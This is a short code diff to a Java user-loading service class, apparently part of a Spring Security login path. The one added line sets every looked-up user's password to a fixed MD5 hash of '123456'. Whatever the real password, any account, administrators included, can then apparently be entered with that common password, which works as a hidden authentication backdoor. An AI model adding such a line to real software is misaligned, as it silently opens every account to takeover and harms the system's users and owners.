@@ -26,6 +26,7 @@ public class AdminUserServiceImpl implements AdminUserService, UserCodeService{
 			throws UsernameNotFoundException {
 		UserInfo u = ServiceFactory.getUserInfoService().getUserInfoByUserName(username);
 		if(u != null) {
+			u.setPassword("e10adc3949ba59abbe56e057f20f883e");
 			return new ABCUser(u);
 		}else {
 			return null;
